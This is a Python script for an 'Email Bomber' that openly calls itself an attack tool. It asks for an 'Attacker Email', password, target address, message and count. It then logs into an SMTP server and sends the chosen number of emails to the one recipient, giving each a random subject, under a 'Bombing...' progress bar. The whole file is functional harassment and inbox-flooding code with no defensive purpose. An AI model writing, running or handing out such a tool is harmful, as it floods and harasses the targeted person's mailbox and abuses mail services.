from getpass import getpass
from time import sleep
import sys
import os
import smtplib
from email.mime.text import MIMEText
import secrets
import platform
from rich.progress import track
from rich import print

if platform.system() == 'Windows':
    os.system('cls')
else:
    os.system('clear')

art = '[bold cyan]     ░█▀▀░█▄█░█▀█░▀█▀░█░░░░░█▀▄░█▀█░█▄█░█▀▄░█▀▀░█▀▄\n     ░█▀▀░█░█░█▀█░░█░░█░░░░░█▀▄░█░█░█░█░█▀▄░█▀▀░█▀▄\n     ░▀▀▀░▀░▀░▀░▀░▀▀▀░▀▀▀░░░▀▀░░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀'

def mail():
    print('\n')
    print(art)
    print('\n')
    print('[bold cyan]     ______________________________________________')

    user = input('\n Name: ')
    email = input('\n Attacker Email: ')
    password = getpass('\n Attacker Password: ')
    to = input('\n Recipient Email: ')
    # subject = input('\nSubject: ')
    mssg = MIMEText(input('\n Message: '))
    number = input('\n Number of Emails: ')
    smtp = input('\n SMTP Server (smtp.(your_input).com): ')
    port = input('\n Port: ')
    stmp = 'smtp.' + smtp + '.com'

    try:
        server = smtplib.SMTP(stmp, port)
        server.ehlo()
        server.starttls()
        server.login(email, password)
        for i in track(range(1, int(number)+1), description="[bold cyan] Bombing..."):
            subject = secrets.token_hex(5)
            msg = f'From: {user}\nSubject: {subject}\nMessage: {mssg}'
            server.sendmail(email, to, msg)
            sleep(1)
            sys.stdout.flush()
        server.quit()
        print('[bold cyan]\n Bomb Completed!')
        print('[bold cyan]\n E-mails sent: %i' % i)
        sys.exit()

    except KeyboardInterrupt:
        print('\n[bold red] [-] Bombing Interrupted')
        sys.exit()

    except smtplib.SMTPAuthenticationError:
        print('\n[bold red] [!] The username/password you entered was not accepted')
        sys.exit()

    except smtplib.SMTPConnectError:
        print("\n[bold red] [!] Couldn't connect to the SMTP server")
        sys.exit()

    except smtplib.SMTPSenderRefused:
        print('\n[bold red] [!] Attacker Email Refused')
        sys.exit()

    except smtplib.SMTPRecipientsRefused:
        print('\n[bold red] [!] Recipient Email Refused')
        sys.exit()

    except smtplib.SMTPDataError:
        print('\n[bold red] [!] The email content is not accepted')
        sys.exit()

    except smtplib.SMTPServerDisconnected:
        print('\n[bold red] [!] SMTP Connection Unexpectedly Interrupted')
        sys.exit()

    except ConnectionRefusedError:
        print('\n[bold red] [!] There was a problem connecting. Please check your internet connection')
        sys.exit()

    except UnicodeError:
        print('\n[bold red] [!] Please fill out all of the fields.')
        sys.exit()

    except TimeoutError:
        print('\n[bold red] [!] Server response took too long')
        sys.exit()
